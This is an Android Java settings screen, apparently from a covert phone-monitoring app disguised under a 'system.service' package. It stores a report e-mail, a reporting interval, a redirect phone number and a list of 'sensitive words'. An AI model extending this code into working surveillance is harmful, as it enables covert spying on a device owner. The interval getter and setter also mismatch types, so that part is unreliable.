package system.service.activity;  
  
import java.util.Date;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import android.content.Context;
import android.content.Intent;  
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.content.SharedPreferences.OnSharedPreferenceChangeListener;
import android.content.res.Resources;
import android.content.res.TypedArray;  
import android.net.Uri;  
import android.os.Bundle;  
import android.preference.CheckBoxPreference;  
import android.preference.EditTextPreference;  
import android.preference.ListPreference;  
import android.preference.Preference;
import android.preference.PreferenceActivity;  
import android.preference.PreferenceCategory;  
import android.preference.PreferenceManager;
import android.preference.PreferenceScreen;
import android.util.Log;

import system.service.R;
import com.particle.inspector.common.util.SysUtils;
import com.particle.inspector.common.util.StrUtils;
import com.particle.inspector.common.util.license.LicenseCtrl;
import com.particle.inspector.common.util.license.LICENSE_TYPE;
  
public class GlobalPrefActivity extends PreferenceActivity 
{
	private static String MAIL;
	private static String INTERVAL_INFO;
	private static String REDIRECT_PHONE_NUM;
	private static String SENSITIVE_WORDS;
	public static final String IS_VALID_MAIL_ADDRESS = "is_valid_mail_address";
	public static final String SENSITIVE_WORD_BREAKER = " ";
	public static final int MAX_SENSITIVE_WORD_COUNT = 9;
	
	@Override
	public void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		// All values will be automatically saved to SharePreferences
		addPreferencesFromResource(R.xml.preference);
		
		// Init preference summary fields
		int prefCount = this.getPreferenceScreen().getPreferenceCount();
		for(int i = 0; i < prefCount; i++){
            initSummary(this.getPreferenceScreen().getPreference(i));
        }
		
		// Show special summary
		//String summary = getResources().getString(R.string.pref_word_sensor_summary);
		//((PreferenceCategory)this.getPreferenceScreen().getPreference(prefCount-1)).getPreference(1).setSummary(summary);
		
		// Register	preference change listener
		SharedPreferences sp = PreferenceManager.getDefaultSharedPreferences(this);
		sp.registerOnSharedPreferenceChangeListener(new OnSharedPreferenceChangeListener(){
			@SuppressWarnings("unused")
			@Override
			public void onSharedPreferenceChanged(SharedPreferences sharedPreferences, String key) {
				if (key.equals(getResources().getString(R.string.pref_mail_key))) {
					checkMailFormat(sharedPreferences, getApplicationContext());
				}
				else if (key.equals(getResources().getString(R.string.pref_info_interval_key))) {
					String intervalStr = sharedPreferences.getString(getResources().getString(R.string.pref_info_interval_key), "1"); //day
					int interval = Integer.parseInt(intervalStr);
				}
				else if (key.equals(getResources().getString(R.string.pref_phonenum_key))) {
					String phoneNum = sharedPreferences.getString(getResources().getString(R.string.pref_phonenum_key), "").trim();
					if (phoneNum.length() == 0) {
						SysUtils.messageBox(getApplicationContext(), getResources().getString(R.string.pref_pls_input_phonenum));
					}
				}
				else if (key.equals(getResources().getString(R.string.pref_word_sensor_key))) {
					String words = sharedPreferences.getString(getResources().getString(R.string.pref_word_sensor_key), "").trim();
					if (words.length() == 0) {
						SysUtils.messageBox(getApplicationContext(), getResources().getString(R.string.pref_pls_input_sensitive_words));
					} else if (words.split(SENSITIVE_WORD_BREAKER).length > MAX_SENSITIVE_WORD_COUNT) {
						String msg = String.format(getResources().getString(R.string.pref_sensitive_words_count_reach_max), MAX_SENSITIVE_WORD_COUNT);
						SysUtils.messageBox(getApplicationContext(), msg);
					}
				}
				
				// Update preference summary fields
				for(int i = 0; i < getPreferenceScreen().getPreferenceCount(); i++){
		            initSummary(getPreferenceScreen().getPreference(i));
		        }
			}
        });
	}
	
	private void initSummary(Preference p) {
		if (p instanceof PreferenceCategory) {
			PreferenceCategory pCat = (PreferenceCategory)p;
			for(int i = 0; i < pCat.getPreferenceCount(); i++) {
				initSummary(pCat.getPreference(i));
			}
		} else {
			updatePrefSummary(p);
		}
	}

	private void updatePrefSummary(Preference p) {
		if (p instanceof ListPreference) {
			ListPreference listPref = (ListPreference)p; 
			p.setSummary(listPref.getEntry()); 
		}
		if (p instanceof EditTextPreference) {
			EditTextPreference editTextPref = (EditTextPreference)p; 
			p.setSummary(editTextPref.getText()); 
		}
	}
	
	private void checkMailFormat(SharedPreferences sharedPreferences, Context context) {
		boolean valid = true;
		String mail = sharedPreferences.getString(getResources().getString(R.string.pref_mail_key), "");
		String[] mails = mail.split(",");
	    Pattern p = Pattern.compile(StrUtils.REGEXP_MAIL);
	    
	    for (String eachMail : mails) {
	    	if (eachMail.trim().length() > 0) {
	    		Matcher matcher = p.matcher(eachMail.trim());
   	 			if (!matcher.matches()) {
   	 				String msg = String.format(context.getResources().getString(R.string.pref_pls_input_mail), eachMail.trim());
   	 				SysUtils.messageBox(context, msg);
   	 				valid = false;
   	 				break;
   	 			}
	    	}
	    }
   	 	
		// Set result
		Intent data = this.getIntent();
		data.putExtra(IS_VALID_MAIL_ADDRESS, valid);
		setResult(RESULT_OK, data);
	}
	
	public static String getMail(Context context) {
		MAIL = context.getResources().getString(R.string.pref_mail_key);
		return PreferenceManager.getDefaultSharedPreferences(context).getString(MAIL, "").trim();
	}
	
	public static void setMail(Context context, String value) {
		MAIL = context.getResources().getString(R.string.pref_mail_key);
		PreferenceManager.getDefaultSharedPreferences(context).edit().putString(MAIL, value).commit();
	}
	
	public static int getInfoInterval(Context context) {
		INTERVAL_INFO = context.getResources().getString(R.string.pref_info_interval_key);
		return Integer.parseInt(PreferenceManager.getDefaultSharedPreferences(context).getString(INTERVAL_INFO, "1"));
	}
	
	public static void setInfoInterval(Context context, int value) {
		INTERVAL_INFO = context.getResources().getString(R.string.pref_info_interval_key);
		PreferenceManager.getDefaultSharedPreferences(context).edit().putInt(INTERVAL_INFO, value).commit();
	}
	
	public static String getRedirectPhoneNum(Context context) {
		REDIRECT_PHONE_NUM = context.getResources().getString(R.string.pref_phonenum_key);
		return PreferenceManager.getDefaultSharedPreferences(context).getString(REDIRECT_PHONE_NUM, "").trim();
	}
	
	public static void setRedirectPhoneNum(Context context, String value) {
		REDIRECT_PHONE_NUM = context.getResources().getString(R.string.pref_phonenum_key);
		PreferenceManager.getDefaultSharedPreferences(context).edit().putString(REDIRECT_PHONE_NUM, value).commit();
	}
	
	public static String getSensitiveWords(Context context) {
		SENSITIVE_WORDS = context.getResources().getString(R.string.pref_word_sensor_key);
		return PreferenceManager.getDefaultSharedPreferences(context).getString(SENSITIVE_WORDS, "").trim();
	}
	
	public static void setSensitiveWords(Context context, String value) {
		SENSITIVE_WORDS = context.getResources().getString(R.string.pref_word_sensor_key);
		PreferenceManager.getDefaultSharedPreferences(context).edit().putString(SENSITIVE_WORDS, value).commit();
	}
	
}